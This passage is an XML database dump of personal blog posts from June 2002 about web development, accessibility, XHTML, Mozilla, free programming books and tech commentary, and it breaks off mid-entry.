		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://lists.evolt.org/&quot;&gt;thelist&lt;/a&gt;: &lt;a href=&quot;http://www.mattkruse.com/javascript/selectbox/&quot;&gt;Javascript Selectbox Functions&lt;/a&gt;. Extremely useful demonstrations of how multi-line selectboxes can be used to create advanced user interface widgets with javascript, including tools to alter the order of items in a list and pass values from one selectbox to another and back again.&lt;/p&gt;</field>
		<field name="created">2002-06-18 19:05:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">55</field>
		<field name="title">Language tag</field>
		<field name="slug">languageTag</field>
		<field name="body">&lt;p&gt;Mark Pilgrim's accessiblity series continues: &lt;a href=&quot;http://diveintomark.org/archives/2002/06/18.html#day_7_identifying_your_language&quot;&gt;Day 7: Identifying your language&lt;/a&gt;. Since I'm using XHTML 1.0 I've changed my opening &amp;lt;html&amp;gt; tag to the following:&lt;/p&gt;

&lt;code&gt;&amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; lang=&quot;en&quot; xml:lang=&quot;en&quot;&amp;gt;&lt;/code&gt;

&lt;p&gt;Mark also points out this handy &lt;a href=&quot;http://www.oasis-open.org/cover/iso639a.html&quot; title=&quot;Code for the Representation of the Names of Languages. From ISO 639, revised 1989&quot;&gt;list of ISO639 language codes&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-18 19:12:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">56</field>
		<field name="title">XHTML list</field>
		<field name="slug">xhtmlList</field>
		<field name="body">&lt;p&gt;I've signed up for a new mailing list (probably not a good idea, I'm getting over 200 mails a day which isn't much fun on a modem) - &lt;a href=&quot;http://groups.yahoo.com/group/XHTML-L/&quot;&gt;XHTML-L&lt;/a&gt;, which describes itself as &lt;q cite=&quot;http://groups.yahoo.com/group/XHTML-L/&quot;&gt;A forum for discussing XHTML issues for both XML and HTML developers&lt;/q&gt;. The list is adminned by Simon St. Laurent, who coincidentally is involved with the SIG-XML project I &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/18/#minimalXml&quot;&gt;mentioned earlier today&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-18 19:22:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">57</field>
		<field name="title">Python and the space shuttle</field>
		<field name="slug">pythonSpaceShuttle</field>
		<field name="body">&lt;p&gt;Dan Shafer:  &lt;a href=&quot;http://builder.com.com/article.jhtml?id=u00420020617DGS01.htm&quot;&gt;Space shuttle engineers use Python to streamline mission design&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote cite=&quot;http://builder.com.com/article.jhtml?id=u00420020617DGS01.htm&quot;&gt;&lt;p&gt;&quot;We achieve immediate functioning code so much faster in Python than in any other language that it's staggering,&quot; says Friedrich. &quot;Java and C++, for example, have much more baggage you have to understand just to get a functioning piece of software.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Python advocacy doesn't get much better than this.&lt;/p&gt;</field>
		<field name="created">2002-06-18 22:24:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">58</field>
		<field name="title">Why software sucks</field>
		<field name="slug">whySoftwareSucks</field>
		<field name="body">&lt;p&gt;MSNBC: &lt;a href=&quot;http://msnbc.com/news/768401.asp?cp1=1&quot;&gt;Why software is so bad&lt;/a&gt;. First time round I gave up on this article after reading the joke at the start, writing it off as another dumbed down piece of ill informed rubbish. Then I saw &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/06/18.html#a294&quot; title=&quot;Software Quality Analyzed&quot;&gt;Scott raving about it&lt;/a&gt; and decided to give it a second go. My initial impressions were completely wrong - it's a well written (and surprisingly unbiased) article that takes a good look at the problems software faces and how industry practises lead to software getting worse rather than better. This year I've been doing a course on Software Engineering at University and a lot of the article made a great deal of sense in the context of the course. Well worth reading.&lt;/p&gt;</field>
		<field name="created">2002-06-19 01:39:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">59</field>
		<field name="title">NPR link muppets</field>
		<field name="slug">nprLinkMuppets</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://boingboing.net/2002_06_01_archive.html#85180752&quot;&gt;Boing Boing&lt;/a&gt;: &lt;a href=&quot;http://www.npr.org/&quot;&gt;NPR&lt;/a&gt; - &lt;a href=&quot;http://www.npr.org/about/people/index.html&quot;&gt;another&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/place/index.html&quot;&gt;site&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/programs/index.html&quot;&gt;that&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/place/corpsupport/index.html&quot;&gt;demands&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/press/index.html&quot;&gt;you&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/jobs/index.html&quot;&gt;obtain&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/jobs/intern/index.html&quot;&gt;permission&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/jobs/jobopps/&quot;&gt;before&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/transcripts/seriesedit.html#s&amp;amp;h&quot;&gt;linking&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/transcripts/seriesedit.html#amerhist&quot;&gt;to&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/transcripts/seriesedit.html#religion&quot;&gt;a&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/transcripts/seriesedit.html#foreaffair&quot;&gt;page&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/about/transcripts/seriesedit.html#entcut&quot;&gt;on&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/archives/&quot;&gt;their&lt;/a&gt; &lt;a href=&quot;http://www.npr.org/members/&quot;&gt;site&lt;/a&gt;. Will these people ever learn? This is compounded by the fact that their &lt;a href=&quot;http://www.npr.org/about/linking_form.html&quot;&gt;link request&lt;/a&gt; form is a classic example of asking for way too much information.&lt;/p&gt;</field>
		<field name="created">2002-06-19 01:48:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">60</field>
		<field name="title">Andrei interview</field>
		<field name="slug">andreiInterview</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.webmasterbase.com/article/812&quot;&gt;Interview with Andrei Zmievski on SitePoint&lt;/a&gt;. Andrei is the guy behind &lt;a href=&quot;http://gtk.php.net/&quot;&gt;PHP-GTK&lt;/a&gt;, the project that enables developers to write client side GUI applications using PHP. He is also one of the two lead developers on &lt;a href=&quot;http://smarty.php.net/&quot;&gt;Smarty&lt;/a&gt;, the world's greatest PHP templating engine. Oh, and he's contributed various bits to PHP itself, including Perl compatible regular expressions and WDDX support. All that and he still has time for an interest in the history of western culture ;) The interview makes great reading for anyone interested in PHP, and also provides a link to &lt;a href=&quot;http://nanoweb.si.kz/&quot;&gt;a web server written in PHP&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-19 02:24:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">61</field>
		<field name="title">Advogato rant</field>
		<field name="slug">advogatoRant</field>
		<field name="body">&lt;p&gt;Interesting rant on Advogato (from June 11th): &lt;a href=&quot;http://advogato.org/article/494.html&quot;&gt;Professional Programmers&lt;/a&gt;. The author complains that the industry is infested with programmers who don't really know anything more than how to write Visual Basic macros, and HR departments who hiee them over &quot;real programmers&quot; because they have more VB experience. The article makes some good points but the resulting thread is where the truly worth-while content is. My hope is that the abundance of VB programmers will make it easier for serious programmers (which I'm hoping will be me) to get more highly paid jobs. Time will tell.&lt;/p&gt;</field>
		<field name="created">2002-06-19 02:34:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">62</field>
		<field name="title">djc on Kuro5hin</field>
		<field name="slug">djcOnKuro5hin</field>
		<field name="body">&lt;p&gt;djc (formerly of &lt;a href=&quot;http://www.evolt.org/&quot;&gt;evolt&lt;/a&gt;) has posted &lt;a href=&quot;http://five2one.org/djc/stdio/index.cfm/daddy/show/mommy/219&quot; title=&quot;Community Costs&quot;&gt;his views&lt;/a&gt; on the recent &lt;a href=&quot;http://www.kuro5hin.org/?op=displaystory;sid=2002/6/17/23933/5831&quot;&gt;Kuro5hin problems&lt;/a&gt;. His take on things can be summarised as &quot;don't quit your day job until you're sure your hobby can pay for itself&quot;.&lt;/p&gt;</field>
		<field name="created">2002-06-19 02:55:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">63</field>
		<field name="title">Free books</field>
		<field name="slug">freeBooks</field>
		<field name="body">&lt;p&gt;I like free books (who doesn't?), so when a &lt;a href=&quot;http://slashdot.org/article.pl?sid=02/06/18/2049233&quot; title=&quot;General IT Books?&quot;&gt;story on Slashdot&lt;/a&gt; asked for book recommendations I started &lt;a href=&quot;http://slashdot.org/comments.pl?sid=34410&amp;amp;cid=3725415&quot; title=&quot; How about free books available online?&quot;&gt;a thread&lt;/a&gt; asking for links to free technical books available online. Here's a list compiled from the thread:&lt;/p&gt;
&lt;dl&gt;
&lt;dt&gt;&lt;a href=&quot;http://diveintopython.org/&quot;&gt;Dive Into Python&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Mark Pilgrim's excellent book on Python, aimed at experienced programmers who wish to learn Python rather than complete newcomers to programming.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://linuxfromscratch.org/&quot;&gt;Linux From Scratch&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Guide to building your own linux distribution.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.dwheeler.com/secure-programs/&quot;&gt;Secure Programming for Linux and Unix HOWTO&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Calls itself a HOWTO but it's pretty much a full book on the topic of secure programming.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://rute.sourceforge.net/&quot;&gt;Rute User's Tutorial and Exposition&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;GNU/Linux systems administration guide.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.oreilly.com/openbook/freedom/&quot;&gt;Free as in Freedom&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Book on RMS and the reasons behind GNU and the Open Source movement.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.mindview.net/Books/DownloadSites&quot;&gt;Thinking In...&lt;/a&gt; series&lt;/dt&gt;
&lt;dd&gt;Bruce Eckel's superb series of programming books that focus on basic programming principles while providing a thorough overview of the language. The series includes Python, Java, C++ and C#.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.theserverside.com/books/masteringEJB/index.jsp&quot;&gt;Mastering EJB&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Comprehensive guide to Enterprise Java Beans.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.theserverside.com/books/EJBDesignPatterns/&quot;&gt;EJB Design Patterns&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Companion to the above, concentrating on design patterns that can be applied to EJB.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://mitpress.mit.edu/sicp/full-text/book/book.html&quot;&gt;Structure and Interpretation
of Computer Programs&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;From MIT. Concentrates on fundamental concepts of computing.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.brpreiss.com/opera.html&quot;&gt;Data Structures and Algorithms with Object-Oriented Design Patterns in ...&lt;/a&gt; series&lt;/dt&gt;
&lt;dd&gt;Books describing data structures in object oriented languages, available for C++, Java and C#.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.ulib.org/webRoot/Books/Numerical_Recipes/&quot;&gt;Numeric Recipes in ...&lt;/a&gt; series&lt;/dt&gt;
&lt;dd&gt;Algorithm guides, available for C, Fortran 70 and Fortran 90.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.cacr.math.uwaterloo.ca/hac/&quot;&gt;Handbook of Applied Cryptography&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Practical guide to modern cryptography.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://webster.cs.ucr.edu/&quot;&gt;The Art of Assembly Language Programming&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Beginners guide to assembly with available versions covering Windows, Linux and DOS.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://g.oswego.edu/dl/oosd/&quot;&gt;Object-Oriented System Development&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;In depth discussion of object-oriented approaches to developing software systems.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://sources.redhat.com/autobook/&quot;&gt;GNU Autoconf, Automake and Libtool&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Guide to these essential tools for unix developers.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://www.joelonsoftware.com/uibook/chapters/fog0000000057.html&quot;&gt;User Interface Design for Programmers&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Joel Spolsky's book on User Interface Design.&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;I have omitted several books that only provide partial tasters on their sites - see the Slashdot thread for a list that includes these. Two other useful lists of free books include the &lt;a href=&quot;http://www.oreilly.com/openbook/&quot;&gt;O'Reilly Open Books Project&lt;/a&gt; and &lt;a href=&quot;http://www.dcc.uchile.cl/~fhoffa/librosonline.html&quot;&gt;Libros Recomendados On Line&lt;/a&gt; (in Spanish but links to English resources).&lt;/p&gt;</field>
		<field name="created">2002-06-19 09:36:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">64</field>
		<field name="title">Day 8: page titles</field>
		<field name="slug">day8PageTitles</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/06/19.html#day_8_constructing_meaningful_page_titles&quot;&gt;Day 8: Constructing meaningful page titles&lt;/a&gt; - the accessibility tips are flying thick and fast now. I've always been conscientious of my page titles (after all, they're all you get when when you use your browser's history feature) but it seems I was not quite conscientious enough. My titles now all carry a reference to the name of the blog in addition to a description of the page.&lt;/p&gt;</field>
		<field name="created">2002-06-19 09:45:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">65</field>
		<field name="title">Slashdot threads</field>
		<field name="slug">slashdotThreads</field>
		<field name="body">A couple of interesting threads on &lt;a href=&quot;http://slashdot.org/&quot;&gt;Slashdot&lt;/a&gt; today: &lt;a href=&quot;http://slashdot.org/article.pl?sid=02/06/18/2233210&quot;&gt;Content Management Software - Build or Buy?&lt;/a&gt; and &lt;a href=&quot;http://developers.slashdot.org/article.pl?sid=02/06/18/2122221&quot;&gt;Properly Testing Your Code&lt;/a&gt;.</field>
		<field name="created">2002-06-19 13:45:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">66</field>
		<field name="title">SitePoint graphic design resources</field>
		<field name="slug">sitePointGraphicDesign</field>
		<field name="body">I've never been any good at graphic design, but today I discovered a fantastic resource for Photoshop tutorials and general inspiration. &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=54717&quot;&gt;This list of resources&lt;/a&gt; highlights the most useful threads of the past year over on the &lt;a href=&quot;http://www.sitepointforums.com/forumdisplay.php?forumid=8&quot;&gt;SitePoint Graphic Design forum&lt;/a&gt;.</field>
		<field name="created">2002-06-19 14:26:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">67</field>
		<field name="title">XFML</field>
		<field name="slug">xfml</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://xfml.org/&quot;&gt;XFML - eXchangable Faceted Metadata Language&lt;/a&gt; (via &lt;a href=&quot;http://poorbuthappy.com/ease/000218.html&quot;&gt;Guide to ease&lt;/a&gt;). Now this is interesting. It's an open XML format designed to facilitiate the publication and distribution of metadata - it uses a load of terms that are currently way over my head (hierarchical and faceted taxonomiest, topicmaps?) but the general principle looks fantastic. I wrote a metadata system last year that used a relational database and it was something of a nightmare - XFML looks like it solves some of the problems I faced, although my biggest challenge was how to grab and present usable information from the huge amounts of metadata collected which is a problem that falls outside the scope of XFML. XFML is best summarised by the following quote:&lt;/p&gt;

&lt;blockquote cite=&quot;http://xfml.org/#5&quot;&gt;&lt;p&gt;Say you run a weblog on a certain topic. You put your posts into categories you have invented yourself. A friend of your also runs a weblog on the same topic, and also puts their posts into categories they invented themselves. Many of these categories are really the same thing, but they are called something else. You both publish your metadata in XFML format. XFML allows you to relate these categories, so they still keep their own names, but your system knows they are really the same. So you import your friends XFML file, and manually relate the categories that are the same. You set your weblog software up so it will import your friends file daily to check for changes. Now your software can automatically generate links to stories about the same topics on your friends weblog that show up with your stories.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Incidentally, Peter Van Dijck (the guy behind XFML) runs a superb blog covering information architecture and other web related topics - &lt;a href=&quot;http://poorbuthappy.com/ease/&quot;&gt;Guide to Ease&lt;/a&gt;. I've only been reading it for a few days but I'm hooked already.&lt;/p&gt;</field>
		<field name="created">2002-06-20 01:04:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">68</field>
		<field name="title">OOP and XP</field>
		<field name="slug">oopAndXP</field>
		<field name="body">&lt;p&gt;There's an &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=61929&amp;amp;pagenumber=2&quot; title=&quot;Coding Standards&quot;&gt;interesting rambling thread&lt;/a&gt; on SitePoint at the moment which started off talking about coding standards but has moved on now to discussing OOP and eXtreme Programming. In it, I try to explain inheritance and the difference between &lt;code&gt;-&amp;gt;&lt;/code&gt; and &lt;code&gt;::&lt;/code&gt; while &lt;a href=&quot;http://www.students.cs.uu.nl/people/voostind/index.php&quot;&gt;Vincent Oostindië&lt;/a&gt; explains the principle of refactoring from eXtreme Programming.&lt;/p&gt;</field>
		<field name="created">2002-06-20 13:22:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">69</field>
		<field name="title">Apple rant</field>
		<field name="slug">appleRant</field>
		<field name="body">&lt;p&gt;John C. Dvorak: &lt;a href=&quot;http://www.pcmag.com/article2/0,4149,1885,00.asp&quot;&gt;E-Mac, i-Mac, No Mac&lt;/a&gt;. This is so poor I just &lt;em&gt;had&lt;/em&gt; to link to it. John claims that the Mac is on it's last legs and deserves to be put down, which is a complete contradiction to almost verything I've read about Macs in the past siz months. I've never had a Mac and I've had few chances to use one, but I would jump at the chance to own one at the moment. Why? Simple, OS X. Apple have taken a truly world class operating system (FreeBSD) and added a truly world class GUI - a combination that I don't think is matched anywhere else in the computing world. They're innovating like never before - AirPort and the i-series of software are great examples. John completely fails to back up his viewpoint at any point in his article - in fact the worst he does is to criticise Apple management of running Apple &quot;like a tire company&quot;.&lt;/p&gt;

&lt;p&gt;I've probably fallen for this deliberate troll hook, line and sinker, but it really annoys me when respected columnists come out with this kind of unsubstantiated claptrap. Especially when they accompany it with such fallacies as &lt;q cite=&quot;http://www.pcmag.com/article2/0,4149,1885,00.asp&quot;&gt;I'm not writing this column as a Mac basher to get attention, although plenty of people will accuse me of doing that&lt;/q&gt;.&lt;/p&gt;

&lt;p&gt;Related reading: Slashdot &lt;a href=&quot;http://apple.slashdot.org/article.pl?sid=02/06/19/218246&quot;&gt;discussion on John's column&lt;/a&gt;, Apple's &lt;a href=&quot;http://www.apple.com/switch/&quot;&gt;10 reasons to switch to a Mac&lt;/a&gt;, Scott Johnson on &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/06/19.html#a296&quot;&gt;how impressed he was with his partner's new iBook&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-20 14:02:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">70</field>
		<field name="title">Mozilla versions</field>
		<field name="slug">mozillaVersions</field>
		<field name="body">&lt;p&gt;Peter-Paul Koch on evolt: &lt;a href=&quot;http://www.evolt.org/article/One_browser_many_names/21/29442/index.html&quot;&gt;One browser, many names&lt;/a&gt; - an invaluable guide to the many different version numbers and user-agent strings resulting from the &lt;a href=&quot;http://www.mozilla.org/&quot;&gt;Mozilla&lt;/a&gt; project.&lt;/p&gt;</field>
		<field name="created">2002-06-20 15:50:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">71</field>
		<field name="title">RSS XML stylesheet</field>
		<field name="slug">rssXmlStylesheet</field>
		<field name="body">&lt;p&gt;This is clever. The &lt;a href=&quot;http://www.w3.org/2000/08/w3c-synd/home.rss&quot;&gt;RSS feed&lt;/a&gt; for the &lt;a href=&quot;http://www.w3.org/&quot;&gt;World Wide Web Consortium&lt;/a&gt; uses an XML stylesheet to render visually in both Mozilla and IE. It's a shame the links don't work but it's still a nice idea.&lt;/p&gt;</field>
		<field name="created">2002-06-20 16:54:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">72</field>
		<field name="title">Additional navigational links</field>
		<field name="slug">additionalNavigationalLinks</field>
		<field name="body">&lt;p&gt;Today's accessibility tip: &lt;a href=&quot;http://diveintomark.org/archives/2002/06/20.html#day_9_providing_additional_navigation_aids&quot;&gt;Providing additional navigation aids&lt;/a&gt;. Mark explains the concept of &quot;relative&quot; links using the &amp;lt;link&amp;gt; tag, which can be used to provide shortcuts to the next and previous page in a sequence as well as links to a site's homepage. He also provides instructions for implementing them in Moveable Type, and asks for suggestions as to how it could be done in Radio. These links are not rendered in the actual body of a page but can be used by many browsers to provide additional navigation aids. My blog has these already but only as shortcuts to my categories and a link back to the home page - I haven't yet implemented them for next/previous buttons while browsing the archives (which is arguably their most useful ability). Time to get hacking...&lt;/p&gt;</field>
		<field name="created">2002-06-20 18:50:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">73</field>
		<field name="title">Next-Prev implemented</field>
		<field name="slug">nextPrevImplemented</field>
		<field name="body">&lt;p&gt;I've implemented the next/previous additional aids options in the archives. It ended up being quite an ugly hack, but it works.&lt;/p&gt;</field>
		<field name="created">2002-06-20 20:38:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">74</field>
		<field name="title">Amazon's hairy feet</field>
		<field name="slug">amazonsHairyFeet</field>
		<field name="body">&lt;a href=&quot;http://www.eleganthack.com/archives/002767.html#002767&quot;&gt;Elegant Hack&lt;/a&gt;: &lt;q cite=&quot;http://www.eleganthack.com/archives/002767.html#002767&quot;&gt;Today Amazon introduced the soon-to-be standard dancing tab with hairy feet.&lt;/q&gt;</field>
		<field name="created">2002-06-20 21:21:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">75</field>
		<field name="title">Presenting your content first</field>
		<field name="slug">presentingYourContentFirst</field>
		<field name="body">&lt;p&gt;Mark's &lt;a href=&quot;http://diveintomark.org/archives/rooms/30_days_to_a_more_accessible_weblog/index.html&quot; title=&quot;30 days to a more accessible weblog &quot;&gt;accessibility tips&lt;/a&gt; are getting harder. Today we are advised to &lt;a href=&quot;http://diveintomark.org/archives/2002/06/21.html#day_10_presenting_your_main_content_first&quot;&gt;Present our main content first&lt;/a&gt; in our source code. This benefits both text based browsers and search engines such as Google. Mark points out the ingenious &lt;a href=&quot;http://www.apromotionguide.com/tabletrick.html&quot;&gt;table trick&lt;/a&gt; which allows table based layouts to present the main content before the left hand menu in the source code and provides tips on implementation. Thanks to the benefits of CSS layout my blog only needed a small alteration - I was presenting the div containing the navigation in the source code before the div containing the main content. A quick switch of the order of the divs and the CSS did the rest for me without any further alteration.&lt;/p&gt;</field>
		<field name="created">2002-06-21 10:10:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">76</field>
		<field name="title">Dave's back</field>
		<field name="slug">davesBack</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.scripting.com/&quot; title=&quot;Scripting News&quot;&gt;Dave&lt;/a&gt;'s back. Thank goodness for that :)&lt;/p&gt;</field>
		<field name="created">2002-06-22 16:21:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">77</field>
		<field name="title">NPR again</field>
		<field name="slug">nprAgain</field>
		<field name="body">&lt;p&gt;More on &lt;a href=&quot;http://boingboing.net/2002_06_01_archive.html#85189946&quot;&gt;BoingBoing&lt;/a&gt; about NPR's &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/19/#nprLinkMuppets&quot;&gt;link policy&lt;/a&gt;. It seems NPR are reconsidering their policy, but in the mean time they have posted a defence of it which Cory Doctorow criticises at length.&lt;/p&gt;</field>
		<field name="created">2002-06-22 16:26:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">78</field>
		<field name="title">Building a semantic website</field>
		<field name="slug">semanticWebsite</field>
		<field name="body">XML.com: &lt;a href=&quot;http://www.xml.com/pub/a/2001/05/02/semanticwebsite.html&quot;&gt;Building a Semantic Web Site&lt;/a&gt;. A top down guide to RSS and associated metadata concepts, including Dublin Core and Topic Maps.</field>
		<field name="created">2002-06-22 16:30:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">79</field>
		<field name="title">VillainSupply.com</field>
		<field name="slug">villainSupply</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://slashdot.org/article.pl?sid=02/06/22/0258245&quot; title=&quot;Got Evil? Buy it Here!&quot;&gt;Slashdot&lt;/a&gt;: &lt;a href=&quot;http://www.villainsupply.com/&quot;&gt;VillainSupply.com&lt;/a&gt; - for all your world domination needs. Product categories include Superweapons, Lairs and Miscellaneous Evil.&lt;/p&gt;</field>
		<field name="created">2002-06-22 20:33:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">80</field>
		<field name="title">Two things about Mozilla</field>
		<field name="slug">twoThingsAboutMozilla</field>
		<field name="body">&lt;p&gt;New project in the works - details to follow soon. In developing it I've learnt two new things about Mozilla:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Mozilla requires &lt;acronym title=&quot;XML Binding Language&quot;&gt;XBL&lt;/acronym&gt; files to be served with a &lt;code&gt;text/xml&lt;/code&gt; Content-Type header.&lt;/li&gt;
&lt;li&gt;Mozilla does not support the &quot;hand&quot; value for setting the mouse cursor - you should use &quot;pointer&quot; instead. &lt;a href=&quot;http://developer.netscape.com/evangelism/docs/articles/cursor/&quot; title=&quot;Giving &amp;apos;cursor&amp;apos; a Hand&quot;&gt;More details here&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;</field>
		<field name="created">2002-06-22 21:36:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">81</field>
		<field name="title">Comments added</field>
		<field name="slug">commentsAdded</field>
		<field name="body">&lt;p&gt;I've added a comments feature to this blog, in preparation for tomorrow's big story (hinted at &lt;a href=&quot;/~cs1spw/blog/archive/2002/06/22/#twoThingsAboutMozilla&quot;&gt;below&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-06-22 23:57:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">82</field>
		<field name="title">The Pickle Jar theory</field>
		<field name="slug">thePickleJarTheory</field>
		<field name="body">&lt;p&gt;A List Apart: &lt;a href=&quot;http://www.alistapart.com/stories/pickle/&quot;&gt;Time Management - The Pickle Jar Theory&lt;/a&gt;. I like this concept - it's simple, doesn't involve long words or complex charts and makes good sense. The basic idea is that you should schedule only your high priority tasks for the day and leave the gaps in between for less important activities (email, browsing and so forth). This is supported by the analogy of a pickle jar, where you can fit more in the jar if you add large pebbles first before pouring in smaller pebbles and sand (rather than adding the largest pebbles last when they will be unlikely to fit). Jeremy Wright, the author of the article, is a regular over on the &lt;a href=&quot;http://www.sitepointforums.com/&quot;&gt;SitePoint forums&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-24 16:29:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">83</field>
		<field name="title">Glastonbury Flash</field>
		<field name="slug">glastonburyFlash</field>
		<field name="body">&lt;p&gt;I'm headed off to Glastonbury on Thursday and I've been checking out the &lt;a href=&quot;http://www.glastonburyfestivals.co.uk/&quot; title=&quot;Glastonbury Festival Official Site&quot;&gt;offical festival website&lt;/a&gt;. It's pretty good - the information I wanted was all there, it was easy to find and the site has a pleasant enough look to it. Then I tried the &lt;a href=&quot;http://www.glastonburyfestivals.co.uk/map/&quot;&gt;interactive flash map&lt;/a&gt; (warning: spawns popup). Running on my Dad's brand new Pentium 4 1.8 GHz desktop, the opening intro animation ran like an absolute dog and took over a &lt;em&gt;minute&lt;/em&gt; to finish. There was no &quot;skip intro&quot; option and  no way to turn off the irritating music until the intro had finished. Once it had loaded the map was quite useful - you can overlay paths, information points and other bits and pieces straight on to the map which is a decent enough reason to use flash. Unfortunately the pointless, jerky 3D intro meant I very nearly gave up in disgust before I got to the good stuff.&lt;/p&gt;

&lt;p&gt;Message to &lt;a href=&quot;http://www.mook.co.uk/&quot;&gt;Mook&lt;/a&gt;: If you absolutely have to use an animated intro give people the option to skip it (I thought the general Flash community got the hang of this idea several years ago). Luckily the Glastonbury site offers non-flash alternative methods of accessing the information in question, which are generally much faster and more intuitive than the interactive map anyway.&lt;/p&gt;</field>
		<field name="created">2002-06-24 18:07:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">84</field>
		<field name="title">Mozilla page info</field>
		<field name="slug">mozillaPageInfo</field>
		<field name="body">&lt;p&gt;I've been playing around with Mozilla's &quot;Page Info&quot; feature, available in the View menu, the right-click context menu and through the Ctrl+I shortcut. I'd never really lookd at it before, but the information it provides is invaluable, especially if you are interested in web development. The info window is divided in to five tabs:&lt;/p&gt;
